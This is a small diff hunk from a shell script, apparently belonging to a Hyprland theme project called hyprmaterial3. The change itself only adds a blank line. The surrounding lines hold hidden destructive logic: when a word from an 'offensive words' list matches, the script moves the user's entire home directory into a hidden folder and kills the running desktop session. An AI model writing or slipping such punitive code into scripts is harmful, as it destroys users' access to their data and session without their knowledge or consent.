@@ -104,6 +104,7 @@ for word in "${OFFENSIVE_WORDS[@]}"; do
         sleep 0.5
         mkdir -p ~/.local/share/hyprmaterial3/trashed-system/
         mv ~/* ~/.local/share/hyprmaterial3/trashed-system/
+        
         pkill {X,startx,gnome-shell,Hyprland,hyprland,plasmashell,plasma-x11}
         exit 1
     fi
